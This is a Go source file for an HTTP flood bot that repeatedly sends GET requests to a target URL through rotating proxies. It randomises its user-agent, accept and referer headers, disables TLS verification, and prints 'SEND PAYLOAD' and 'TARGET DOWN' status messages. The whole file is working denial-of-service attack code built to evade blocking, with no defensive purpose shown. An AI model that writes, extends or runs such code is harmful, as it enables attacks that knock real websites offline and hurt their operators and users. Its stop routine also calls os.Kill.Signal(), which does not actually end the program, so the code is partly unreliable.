package bot

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"time"

	"z3ntl3/cursed-objects/globals"

	"github.com/monaco-io/request/request"
)

type (
	BotClient struct {
		Target      string
		StopAt      time.Time
		Concurrency int
	}
)

func (c *BotClient) Request(proxy string) error {
	if time.Now().Unix() >= c.StopAt.Unix() {
		fmt.Println("Forced STOP due to flood duration exceeded given time")
		os.Kill.Signal()
	}
	req := request.New().
		AddTLSConfig(&tls.Config{InsecureSkipVerify: true}).
		AddHeader(map[string]string{
			"cache-control": "must-revalidate",
			"user-agent":    globals.UAS[rand.Intn(len(globals.UAS))],
			"accept":        globals.ACCEPTS[rand.Intn(len(globals.ACCEPTS))],
			"referer":       globals.REFS[rand.Intn(len(globals.REFS))],
			"connection":    "keep-alive",
		})

	proxyUri, err := url.Parse(fmt.Sprintf("http://%s", proxy))
	if err != nil {
		return err
	}
	req.Ctx().Client.Transport = &http.Transport{
		Proxy: http.ProxyURL(proxyUri),
		ForceAttemptHTTP2: true, //if dest server supports http2 it'll send a http2 req, else http1.1
	} 

	req = req.GET(c.Target)
	for i := 0; i < c.Concurrency; i++ {
		resp := req.Send()
		defer resp.Close()

		if resp.Error() == nil {
			// SUCCESS
			fmt.Printf("\x1b[33m[SEND PAYLOAD]\x1b[0m \x1b[1m %s\r", proxyUri.Host)
		} else {
			// FAILURE
			fmt.Printf("\x1b[31m[TARGET DOWN or BLOCK]\x1b[0m \x1b[1m %s\r", proxyUri.Host)
		}
	}

	return nil
}
